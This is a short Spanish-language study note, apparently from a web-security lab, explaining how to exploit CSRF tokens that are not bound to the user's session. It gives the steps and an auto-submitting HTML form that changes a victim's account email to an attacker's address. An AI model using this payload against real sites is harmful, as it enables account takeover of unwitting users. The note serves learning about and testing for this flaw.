# CSRF con token no vinculado a la sesión 

Tags: #CSRF #BurpSuite #XSRF   

```bash 
En esta ocasión se emplean token para prevenir ataques CSRF, pero no estan integrados a la sesión del sito 

1. Se tiene dos inicios de sesión con credenciales diferentes 
2. Los CSRF token que viajan son solo de un único uso 
3. Se debe de interceptar el token de cualquier usuario y no usarlo
4. Verificar si el CSRF token esta vinvulado a una única cuenta (Que no es el caso) usandolo con el otro usuario al momento de cambiarle el correo 
5. Enviar el formulario con un token sin usar a la víctima 
```

```HTML
<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
	<input required="" type="hidden" name="csrf" value="123234556qwerty">
</form>

<script>
	document.forms[0].submit();     // Hacer que se envie automaticamente 
</script>
```